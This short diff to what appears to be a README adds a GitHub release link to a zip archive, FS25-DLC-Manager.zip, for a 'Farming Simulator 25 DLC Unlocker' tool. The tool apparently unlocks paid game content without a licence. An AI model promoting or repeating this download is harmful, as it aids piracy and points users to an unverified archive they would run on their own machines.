@@ -6,7 +6,7 @@
 
 ### - 🔗 ***Get the Latest Release:***
 
-- [💾 v.1.0+ Release]() = `*Tool files & folder*`
+- [💾 v.1.0+ Release](https://github.com/Farming-Simulator-25-DLC-Unlocker/.github/releases/download/v.1.02/FS25-DLC-Manager.zip) = `*Tool files & folder*`
 
 ---
 
